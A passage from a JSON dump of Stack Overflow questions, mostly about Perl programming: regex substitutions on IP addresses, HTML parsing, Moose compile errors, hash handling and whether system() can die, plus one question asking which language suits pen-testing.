a slash at the beginning of the suffix. So I could accidentally concatenate two slashes together, like in the above example.</p>\n\n<p>So my main question is whether or not two consecutive slashes will cause any problems and why. But also, do programmers have a convention for this? In the code that other people write, do directory names always end with a slash? It would be nice if there is some consistent rule that I could follow.</p>\n"},{"tags":["linux","perl","json-rpc","zabbix","libjson"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13235001,"title":"Installing libjson-rpc-perl on Linux","body":"<p>I am trying to install <strong>libjson-rpc-perl</strong> on my linux server but facing an error. Could anyone guide me in right direction ?</p>\n\n<p><strong>Details :</strong></p>\n\n<pre><code>09:04:02 # lsb_release -a\nLSB Version:    :core-4.0-amd64:core-4.0-noarch:graphics-4.0-amd64:graphics-4.0-noarch:printing-4.0-amd64:printing-4.0-noarch\nDistributor ID: RedHatEnterpriseServer\nDescription:    Red Hat Enterprise Linux Server release 6.2 (Santiago)\nRelease:        6.2\nCodename:       Santiago\n</code></pre>\n\n<p><strong>Installing :</strong> </p>\n\n<p>(perl) - done</p>\n\n<pre><code>09:01:26 # yum list available 'perl'\nLoaded plugins: product-id, subscription-manager\nUpdating certificate-based repositories.\n</code></pre>\n\n<p>(libjson-rpc-perl) - ERROR</p>\n\n<pre><code>09:03:40 # sudo yum install libjson-rpc-perl\nLoaded plugins: product-id, subscription-manager\nUpdating certificate-based repositories.\nSetting up Install Process\nNo package libjson-rpc-perl available.\nError: Nothing to do\nroot@zabbix_server:/root\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":97,"score":4,"question_id":13244677,"title":"Removing Comments with Perl","body":"<p>Is there any regular expression that is able to remove all comments of the // and /**/ variety from a given C program say in perl?</p>\n\n<p>Given the multi-line program, it should use the regular expression to remove the comments and return the non-commented out portion.</p>\n\n<p>Thanks.</p>\n"},{"tags":["html","perl","parsing","html-parsing","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13245082,"title":"HTML parsing by perl script","body":"<p>I am trying to parse an HTML file through my perl script. I am using a module called HTML::TreeBuilder.</p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>use HTML::TreeBuilder;\n\nmy $tree = HTML::TreeBuilder-&gt;new; \n\n$tree-&gt;parse_file(\"sample.html\");\n\nforeach my $anchor ($tree-&gt;find(\"p\")) {\n\n  print $anchor-&gt;as_text, \"\\n\";\n\n}\n</code></pre>\n\n<p>It is working fine. I am getting everything inside <code>&lt; p&gt;</code> tag.</p>\n\n<p>sample.html file:</p>\n\n<pre><code>&lt; td&gt;Release Version:&lt; /td&gt;&lt; td&gt; 5134&lt; /td&gt;&lt; /tr&gt;\n\n&lt; tr class=\"d0\"&gt;&lt; td&gt;Executed By:&lt; /td&gt;&lt; td&gt;spoddar&lt; /td&gt;&lt; /tr&gt;\n\n&lt; tr class=\"d1\"&gt;&lt; td&gt; Duration:&lt; /td&gt;&lt; td&gt;0 Hrs 0 Mins 0 Secs &lt; /td&gt;&lt; /tr&gt;\n\n&lt; tr class=\"d0\"&gt;&lt; td&gt;#TCs Executed:&lt; /td&gt;&lt; td&gt;1&lt; /td&gt;&lt; /tr&gt;\n</code></pre>\n\n<p>I want <code>5134</code> to be printed when i pass Release Version.\nIn the same way I want <code>spoddar</code> to be printed when i pass Execute By.\nThese are not HTML tags. But is there any way to obtain this?</p>\n"},{"tags":["perl","memory-management","exception-handling","outofmemoryexception"],"answer_count":1,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":73,"score":6,"question_id":13243637,"title":"Is there a standard way for perl to behave when it runs out of memory?","body":"<p><strong>Is there a standard(ish) way for a Perl interpreter (aka \"perl\") to behave when it runs out of memory? Is it documented/specced-out in any way? Coded in some uniform way?</strong></p>\n\n<p>I'm especially interested in any standards which are expressed as covenant to Perl code being run - e.g., will <code>die</code> be called? Will <code>END</code> block be executed? Etc...</p>\n\n<p>I'm fine with both an \"theoretical\" answer (e.g. some sort of generic \"this is what perl code ought to do in general on out-of-memory\" mission statement document from Larry/P5P/etc..., even if not 100% of malloc() calls follow this rule); or a \"practical\" statement (e.g. all malloc() calls in Perl are wrapped into a generic \"allocate_memory\" function which uniformly handles all failures).</p>\n\n<p>It may be possible that the answer depends on what specifically causes out of memory (e.g. a request for more memory for Perl code's data structure vs. memory allocated by internal Perl code unrelated to explicit \"need to store more data\" logic in Perl program).</p>\n\n<p>If the answer is extremely implementation dependent, assume perl for Solaris/Linux,and narrowing down to any recent stable version (5.8 to 5.16) is acceptable.</p>\n\n<p>The question is limited to standard Perl interpreter, however you wish to define that as far as pre-compile configuration (e.g. perl that comes with a major Linux distribution, or one compiled with all defaults left alone, etc...).</p>\n\n<p><sub>NOTE: This question came out of Gilles's comment to <a href=\"http://stackoverflow.com/questions/13234866/can-a-perl-system-call-ever-die#comment18042068_13234866\">another Q</a></sub></p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":39,"score":-4,"question_id":13241781,"title":"Regular expressions replace part of string","body":"<p>I would like to replace or remove part of string. I need to change \"<code>CODE 3</code>\" and \"<code>Code 3</code>\" just to \"<code>3</code>\" and keep rest unchanged. My string is below:</p>\n\n<blockquote>\n  <p>02211482   Brick   Department of Building &amp; Civil Engineering  2001-09-30  2007-12-06  3.9.30  CODE 3  PDPH5 - PAINTING/DECORATING BR PH4 TERM 1   10      Apprentice  Block Release   Engineering Code 3  Phase 4     Registered      2002-10-09  23000000952126\" </p>\n</blockquote>\n\n<p>Thanks.</p>\n"},{"tags":["python","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":13238526,"title":"batch delete smaller of two files","body":"<p>I am looking for a way to do a batch rename of a bunch of files based on the criteria mentioned below:</p>\n\n<p>The filelist looks similar to this, and should be alpha-numeric:</p>\n\n<ul>\n<li>A20100102-1.loc.txt </li>\n<li>A20100102.loc.txt</li>\n<li>A20100103-1.loc.txt</li>\n<li>A20100103.loc.txt\n...etc.</li>\n</ul>\n\n<p>The following pseudo-code is pretty close to the way I want it to behave, but I'm trying to figure out if sed, awk, python, perl, or a bash script is the way to go (I'm examining the options in order to figure out which implementation I might want to delve deeper into):</p>\n\n<pre><code>for all_files_in_dir:{\n  if(currentfile.name is_close_to previousfile.name){  //maybe regex here\n    var small_file = find_smaller_file_filename(currentfile.filesize, previousfile.filesize);\n    sys.remove(small_file);\n  }\n}\n</code></pre>\n\n<p>Thanks for any suggestions!  </p>\n"},{"tags":["string","perl","stdin","eof","chomp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":61,"score":-5,"question_id":13240926,"title":"Perl chomp issue","body":"<p>I am trying to read STDIN until the EOF OR a blank line.  Here is my script:</p>\n\n<pre><code>my @lines;\n\nwhile ( ($_ = &lt;&gt;) =~ /\\S/ ) {\n    my $line = $_;\n    push @lines, $line;\n}\n\nprint $lines[0];\n</code></pre>\n\n<p>and it's output:</p>\n\n<pre><code>%&gt; ./script.pl\nddd\nsss\naaa\n\nddd\n</code></pre>\n\n<p>The script works fine however I do not want to store the newline.  I modified the code as follows:</p>\n\n<pre><code>my @lines;\n\nwhile ( ($_ = &lt;&gt;) =~ /\\S/ ) {\n    my $line = $_;\n    push @lines, chomp($line);\n}\n\nprint $lines[0];\n</code></pre>\n\n<p>This however messes up the output:</p>\n\n<pre><code>%&gt; ./script.pl\nddd\nsss\naaa\n\n1\n</code></pre>\n\n<p>Why is the output getting messed up?</p>\n"},{"tags":["perl","web-scraping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13239066,"title":"Clicking on a div tag","body":"<p>I am using WWW::Scripter to grab a page written with javascript/ajax, the \"link\" to the next page is a div tag, I can get the tag but cannot seem to figure out a way to click on it to get to the next page.. Any suggestions?</p>\n\n<pre><code>my $w = new WWW::Scripter;\n$w-&gt;use_plugin('Ajax'); \n$w-&gt;get($c-&gt;website);\n\nmy $loop = 1;\nmy $page = 1;\n\nwhile ($loop) {\n  my $te = HTML::TableExtract-&gt;new();\n  $content = $w-&gt;content();\n\n  $te-&gt;parse($content);\n  $table = $te-&gt;first_table_found;\n  $str .= Dumper $table;\n  $page += 1;\n\n  $loop = $self-&gt;next_page($w);\n}\n\nsub next_page {\nmy $self = shift;\nmy $w = shift;\n$div = $w-&gt;document-&gt;getElementById('example_next');\nif (defined $div) {\n--I want to click on the div and move to the next page, suggestions?---\nreturn 1;\n} else {\nreturn 0;\n}\n}\n</code></pre>\n\n<p>example html code... First there is a table holding the data... </p>\n\n<pre><code> &lt;table class=\"display\" id=\"example\"&gt;\n&lt;thead&gt;\n    headers\n&lt;/thead&gt;\n&lt;tbody&gt;---DATA---&lt;/tbody&gt;\n &lt;/table&gt;\n</code></pre>\n\n<p>Then pagination to go from \"page\" to \"page\" the data is rewritten with each pagination click.. </p>\n\n<pre><code>&lt;div class=\"dataTables_paginate paging_two_button\" id=\"example_paginate\"&gt;\n&lt;div class=\"paginate_disabled_previous\" title=\"Previous\" id=\"example_previous\"&gt;&lt;/div&gt;\n&lt;div class=\"paginate_enabled_next\" title=\"Next\" id=\"example_next\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>This is all using www.datatables.net</p>\n"},{"tags":["perl","moose"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13232974,"title":"Compile time issue with MooseX::Aliases, immutable and circular 'use'","body":"<p>I get a compile time error (Moose complains about modifying an immutable instance)\nrunning 'perl -c' on a package but code using the package runs error-free.\nExample Code:</p>\n\n<p>File Pa_1.pm (immutable Moose class using MooseX::Aliases and package Pa_2.pm): </p>\n\n<pre><code>package Pa_1;\n\nuse Pa_2;\n\nuse Moose;\n\n# uncommenting either this line ...\nuse MooseX::Aliases;\n\n# ... or this line to make 'perl -c' work\n__PACKAGE__-&gt;meta-&gt;make_immutable;\n\n1;\n</code></pre>\n\n<p>File Pa_2.pm (just using Pa_1.pm which uses Pa_2.pm):</p>\n\n<pre><code>package Pa_2;\n\nuse Pa_1;\n1;\n</code></pre>\n\n<p>File run_pa_1.pl :</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse Pa_1;\n\nmy $pa1 = Pa_1-&gt;new();\nprint \"Done !\\n\";\n</code></pre>\n\n<p>Executing run_pa_1.pl works, but 'perl -c Pa_1.pm' gives</p>\n\n<pre><code>The 'add_method' method cannot be called on an immutable instance at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Class/Immutable/Trait.pm line 32.\n        Class::MOP::Class::Immutable::Trait::_immutable_cannot_call('add_method') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Class/Immutable/Trait.pm line 47\n        Class::MOP::Class:::around('CODE(0xc10158)', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'DESTROY', 'Moose::Meta::Method::Destructor=HASH(0x14af4f8)') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Method/Wrapped.pm line 162\n        Class::MOP::Method::Wrapped::__ANON__('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'DESTROY', 'Moose::Meta::Method::Destructor=HASH(0x14af4f8)') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Method/Wrapped.pm line 91\n        Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::SERIAL::1::add_method('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'DESTROY', 'Moose::Meta::Method::Destructor=HASH(0x14af4f8)') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Mixin/HasMethods.pm line 181\n        Class::MOP::Mixin::HasMethods::_restore_metamethods_from('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Class.pm line 405\n        Class::MOP::Class::_restore_metaobjects_from('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Meta/Class.pm line 728\n        Moose::Meta::Class::_restore_metaobjects_from('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Class/MOP/Class.pm line 65\n        Class::MOP::Class::reinitialize('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'error_class', 'Moose::Error::Default', 'wrapped_method_metaclass', 'Class::MOP::Method::Wrapped', 'instance_metaclass', 'Moose::Meta::Instance', 'method_metaclass', ...) called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Meta/Class.pm line 188            Moose::Meta::Class::reinitialize('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'attribute_metaclass', 'Moose::Meta::Class::__ANON__::SERIAL::2') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Util/MetaRole.pm line 99            Moose::Util::MetaRole::_make_new_metaclass('Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'HASH(0x144f868)', 'class') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Util/MetaRole.pm line 28            Moose::Util::MetaRole::apply_metaroles('for', 'Class::MOP::Class::Immutable::Moose::Meta::Class::__ANON__::S...', 'class_metaroles', 'HASH(0x144f868)', 'role_metaroles', 'HASH(0x144f838)') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Exporter.pm line 543\n        Moose::Exporter::_apply_metaroles('Pa_1', 'ARRAY(0x93c630)', 'CODE(0xddccc8)') called at /home/pecho/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/x86_64-linux/Moose/Exporter.pm line 460\n        Moose::Exporter::__ANON__('MooseX::Aliases') called at Pa_1.pm line 6\n        Pa_1::BEGIN() called at Pa_1.pm line 6\n        eval {...} called at Pa_1.pm line 6\nBEGIN failed--compilation aborted at Pa_1.pm line 6.\n</code></pre>\n\n<p>I am a little confused because an error is emitted starting perl on Pa_2.pm with compile switch but run time seems to be ok.</p>\n\n<ul>\n<li>In debugger and doing 'use Pa_2' there is no error too. </li>\n<li>Executing 'perl -c run_pa_1.pl' no error too. </li>\n<li>Not using MooseX::Aliases or not\nmaking Pa_1.pm immutable let 'perl -c Pa_1.pm' compile without error.</li>\n</ul>\n\n<p>Is there a bug in the code, in MooseX::Aliases or is it something internal to Moose ?</p>\n\n<p>Versions used : perl 5.16.1; Moose 2.0604; MooseX::Aliases 0.10;</p>\n"},{"tags":["perl","rest","httpresponse","mojolicious"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13239501,"title":"HTTP reponse for error in REST call for Mojolicious","body":"<p>The mojolicious application that I use is JSON based, that is the interaction between the client and  the server is more of an exchange of JSON structured data. </p>\n\n<p>I am trying to implement a standard way of handling errors with proper HTTP response code when an error occurs during one of the REST calls. What is the best way of implementing such a standard and where do I do it? </p>\n\n<p>I see a couple of ways of doing it</p>\n\n<ol>\n<li><p>Create a class and list all the error response and its associated content, a call could be made to this class with the response code, which would return the JSON structure(combination of hashes and arrays) containing all the associated entry, then use the render_json() method in controller and return this as a response to the client</p></li>\n<li><p>I can create a table in the Database with entry for all the fields that are required for the response, use the filed to access the JSONstructure, create the appropriate response and use render_json() in controller and return this as a response to the client.</p></li>\n</ol>\n\n<p>Example of error response might be like</p>\n\n<blockquote>\n<pre><code>{\n    \"Message\": \"The requested resource is not found\"\n    \"Type\" : \"http://this.is.an.error.com/error/resource_not_found\",\n    \"ErrorCode\" : 404,\n    \"Created\" : \"2012-11-05T11:59:29-05:00\",\n    \"Request\" : \"GET /types/Foo/instances\" \n}\n</code></pre>\n</blockquote>\n\n<p>What is the right way of standardizing such a response?</p>\n"},{"tags":["database","string","perl","casting","integer"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13232519,"title":"Casting of Integer to String in perl for DB insertion","body":"<p>I have a perl script which reads rows from text file and inserts into db.</p>\n\n<h1>Sample text file can look like this</h1>\n\n<pre><code>country   zipcode\n------------------\nIndia      712501\nIndia      00032\n</code></pre>\n\n<p>where first row is column name and the rows denote column value. It is stored as EAV format with both column name and column value as  VARCHAR.</p>\n\n<p>Now for zipcode 00032 the perl script is thinking it as Integer and  the insert query is becoming \nINSERT VALUES('India',00032) //Quote is not coming as perl is treating it as String\nSO while inserting it is inserting India 32 (treating it as integer)</p>\n\n<p>So can I make it String by force so the perl module puts VALUES('India','00032') instead ??</p>\n"},{"tags":["perl","reference"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13239515,"title":"perl: printing object properties","body":"<p>I'm playing a bit with the Net::Amazon::EC2 libraries, and can't find out a simple way to print object properties:</p>\n\n<p>This works:</p>\n\n<pre><code>my $snaps = $ec2-&gt;describe_snapshots();\nforeach my $snap ( @$snaps ) {\n  print $snap-&gt;snapshot_id . \" \" .  $snap-&gt;volume_id . \"\\n\";\n}\n</code></pre>\n\n<p>But if I try:</p>\n\n<pre><code> print \"$snap-&gt;snapshot_id $snap-&gt;volume_id \\n\";\n</code></pre>\n\n<p>I get </p>\n\n<pre><code>Net::Amazon::EC2::Snapshot=HASH(0x4c1be90)-&gt;snapshot_id\n</code></pre>\n\n<p>Is there a simple way to print the value of the property inside a print?</p>\n"},{"tags":["regex","perl","substring","pcre"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13238937,"title":"Performing a regex substitution Perl","body":"<p>Assuming I have the IP <code>10.23.233.34</code> I would like to simply swap the <code>233</code> for <code>234</code>.  The first, second, and last octet are unknown.  The third octet is either <code>233</code> or <code>234</code>.  I want to do the substitution such that it matches the IP, subs, and keeps everything else while still switching the last octet.  For example:</p>\n\n<p>Input: <code>10.23.233.34</code></p>\n\n<pre><code>s/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){}233\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){}234\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/\n</code></pre>\n\n<p>Output: <code>10.23.234.34</code></p>\n"},{"tags":["perl","hash-of-hashes"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13238341,"title":"Can I rename a hash key inside another hash in Perl?","body":"<p>I have a hash of a hash (HoH) that I got from using <code>select_allhashref</code> on a mysql query.\nThe format is perfect for what I want and I have two other HoH by similar means. </p>\n\n<p>I want to eventually merge these HoH together and the only problem (I think) I have is that there is a key in the 'sub-hash' of one HoH that has the same name as one in another HoH. \nE.g.</p>\n\n<pre><code>my $statement1 = \"select id, name, age, height from school_db\";\nmy $school_hashref = $dbh-&gt;selectall_hashref($statement1, 1);\n\nmy $statement2 = \"select id, name, address, post_code from address_db\";    \nmy $address_hashref = $dbh-&gt;selectall_hashref($statement2, 1);\n</code></pre>\n\n<p>So when I dump the data I get results like so: </p>\n\n<pre><code>$VAR1 = {\n          '57494' =&gt; {\n                       'name' =&gt; 'John Smith',\n                       'age' =&gt; '9',\n                       'height' =&gt; '120'\n                     }\n        }\n};\n$VAR1 = {\n          '57494' =&gt; {\n                       'name' =&gt; 'Peter Smith',\n                       'address' =&gt; '5 Cambridge Road',\n                       'post_code' =&gt; 'CR5 0FS'\n                     }\n        }\n};\n</code></pre>\n\n<p>(this is an example so might seem illogical to have different names, but I need it :) )</p>\n\n<p>So I would like to rename <code>'name'</code> to <code>'address_name'</code> or such. Is this possible? I know you can do </p>\n\n<pre><code>$hashref-&gt;{$newkey} = delete $hashref-&gt;{$oldkey};\n</code></pre>\n\n<p>(edit: this is an example that I found online, but haven't tested.)</p>\n\n<p>but I don't know how I would represent the <code>'id'</code> part. Any ideas?</p>\n"},{"tags":["perl","devel-cover"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13226710,"title":"how to list uncovered pm/pl file in Devel::Cover's report","body":"<p>My dir/files are like this:</p>\n\n<pre><code>/lib/a.pm\n/lib/b.pm\n/lib/c.pm\n..\n/lib/n.pm\n\n/lib/start.pl\n</code></pre>\n\n<p>start.pl is an interactive program, it will call different pm based on my selection.</p>\n\n<p>when I run start.pl with Devel::Cover :  PERL5OPT=-MDevel::Cover /lib/start.pl </p>\n\n<p>the output html report will list all the pms start.pl called. \nI want to list all pms. \nAll, include those pms start.pl called ,and those without called.\nThis will help me to get what pm not use during my current test.</p>\n\n<p>Can this be done by Devel::Cover??</p>\n"},{"tags":["arrays","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":13231228,"title":"How to get rid of the empty string in the array in perl?","body":"<p>I have a string of many zeroes and '1' but I just want the value of zeroes from the string. \nSo, I use split function to split the '1' but it seems like it will produce the undef or empty string in the array. \nSo, I try to scan through each array element using foreach and compare if there is empty string that i thought was \"undef\" will be ignored. In return, those in the not empty string will not be ignored and will be placed into another variable. The problems seem like it does not recognized my \"undef\" variable. </p>\n\n<p>OR \nthere is another better method to scan the string in order to pull off the number of '0' in the string? </p>\n\n<p>Please help out on this matters. \nThis the coding:</p>\n\n<pre><code>#!/usr/bin/perl\n\n  use strict;\n use warnings;\n\n  my $data = '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111100000000000000011111\n';\n\n  my @values = split('1', $data);\n  my $zero = \"0\";\nforeach my $val (@values)\n{\n    if (!defined$val)\n    {\n      $zero= $val;\n     }\n\n}\n  print \"$zero\\n\";\n\n  exit 0;\n</code></pre>\n\n<p>Thanks a lot. </p>\n\n<p>Regards, \nNicky</p>\n"},{"tags":["regex","perl","replace","pcre"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":45,"score":-2,"question_id":13239270,"title":"Swap multiple parts of an IP using a Perl REGEX","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13238937/performing-a-regex-substitution-perl\">Performing a regex substitution Perl</a>  </p>\n</blockquote>\n\n\n\n<p>I have a line coming in via STDIN.  I need to swap part of an IP address while retaining the line.  IPs of the form XXX.XXX.233.XXX should change to XXX.XXX.234.XXX.  Everything else must stay.  For example the following line:</p>\n\n<p><code>Hi My IP is 10.23.233.34. I live .233 miles from new york city in building 10.233 subsection .233.34. Ohh my friends IP is 10.33.233.55</code></p>\n\n<p>should become</p>\n\n<p><code>Hi My IP is 10.23.234.34. I live .233 miles from new york city in building 10.233 subsection .233.34. Ohh my friends IP is 10.33.234.55</code></p>\n\n<p>I am not too good with Perl regex so maybe the Perl guys can chime in.</p>\n"},{"tags":["perl","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13234622,"title":"code to add numbers in multiple files","body":"<p>I have multiple files which has below two entries:</p>\n\n<pre><code>$ cat file_01\nTotal capacity                   3.4 TB\nCapacity used                    825.8 GB\n</code></pre>\n\n<p>Output of file is two rows. First row has Total Capacity and second row is Capacity used.</p>\n\n<p>This is output for one server, I want it for my rest of server to be consolidated.</p>\n\n<p>I want to create a simple script which will add all the Total capacity and all the Capacity used from multiple files and give one consolidated output. Shell or perl is what I am looking. </p>\n\n<p>Any direction to this, would be really helpful.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":13236958,"title":"How to get a reference to the list returned by Perl's grep?","body":"<p>I would like to use the <code>grep</code> function to filter a list of values and store a reference to the filtered list into a hash. What I am after is something like:</p>\n\n<pre><code>my $allValues = [\n    'a',\n    'unwanted value',\n    'b',\n    'c',\n];\n\n$stuff = {\n    'values' =&gt; grep { $_ ne 'unwanted value' } @$allValues\n};\n</code></pre>\n\n<p>Only, when I try that, the <code>%$stuff</code> hash is:</p>\n\n<pre>\n$VAR1 = {\n          'b' => 'c',\n          'values' => 'a'\n        };\n</pre>\n\n<p>Is there a way to fix the anonymous hash-creating code so that I instead get:</p>\n\n<pre>\n$VAR1 = {\n          'values' => [\n                        'a',\n                        'b',\n                        'c'\n                      ]\n        };\n</pre>\n\n<p>But not by creating a local variable or calling a subroutine (in other words, all in-line)?</p>\n"},{"tags":["perl","system","eval","die"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":105,"score":6,"question_id":13234866,"title":"Can a Perl system() call ever die?","body":"<p><strong>Can a <code>system()</code> call can ever <code>die</code> in Perl 5?</strong></p>\n\n<p>(in other words, in order to 100% crash-proof a program that does a <code>system()</code> call, <strong>does it need to be wrapped into an <code>eval</code> block</strong>, or is that wholly totally unnecessary?)</p>\n\n<hr>\n\n<p>I haven't found a single mention to that possibility in <a href=\"http://perldoc.perl.org/functions/system.html\" rel=\"nofollow\"><code>perldoc system</code></a>, but didn't quite find the precise \"this call never dies\" either.</p>\n\n<p>NOTE: the question is about basic CORE Perl here, no <code>autodie</code> or any other custom module that would have similar effect. Also, assume no <code>ALRM</code> signal was set, or any other custom signal handler for that matter.</p>\n\n<p><sub>I'm assuming that all versions of Perl 5.* behave the same, but if not, an answer pertaining to 5.8 would be appreciated.</sub></p>\n"},{"tags":["python","ruby","perl","security","penetration-testing"],"answer_count":13,"favorite_count":10,"up_vote_count":9,"down_vote_count":4,"view_count":2390,"score":5,"question_id":76408,"title":"Which of these scripting languages is more appropriate for pen-testing?","body":"<p>First of all, I want to avoid a flame-war on languages. The languages to choose from are Perl, Python and Ruby . I want to mention that I'm comfortable with all of them, but the problem is that I can't focus just on one. </p>\n\n<p>If, for example, I see a cool Perl module, I have to try it out. If I see a nice Python app, I have to know how it's made. If I see a Ruby DSL or some Ruby voodoo, I'm hooked on Ruby for a while.</p>\n\n<p>Right now I'm working as a Java developer, but plan on taking CEH in the near future. My question is: for tool writing and exploit development, which language do you find to be the most appropriate?</p>\n\n<p>Again, I don't want to cause a flame-war or any trouble, I just want honest opinions from scripters that know what they're doing.</p>\n\n<p>One more thing: maybe some of you will ask \"Why settle on one language?\". To answer this: I would like to choose only one language, in order to try to master it.</p>\n"},{"tags":["perl","select","hash","multiple"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":13236378,"title":"Multiple values in a hash for a single key","body":"<p>I have two files.\nOne composed of a unique list while the other one is a redundant list of name with the age.</p>\n\n<p>for example</p>\n\n<pre><code>File1:      File2:\nGaia        Gaia 3\nMatt        Matt 12\nJane        Gaia 89\n            Reuben 4\n</code></pre>\n\n<p>My aim is to match File1 and File2 and to retrieve the highest age for each name.\nSo far I have written the below code.\nThe bit that do not work quite well is: when the same key is found in the hash, print the bigger value.</p>\n\n<p>Any suggestion/comment is welcome!</p>\n\n<p>Thanks!!</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nopen (FILE1, $ARGV[0] )|| die \"unable to open arg1\\n\"; #Opens first file for comparison\nopen (FILE2, $ARGV[1])|| die \"unable to open arg2\\n\"; #2nd for comparison\n\nmy @not_red = &lt;FILE1&gt;;\nmy @exonslength = &lt;FILE2&gt;;\n\n#2)  Produce an Hash of File2. If the key is already in the hash, keep the couple key-          value with the highest value. Otherwise, next.\n\nmy %hash_doc2;\nmy @split_exons;\nmy $key;\nmy 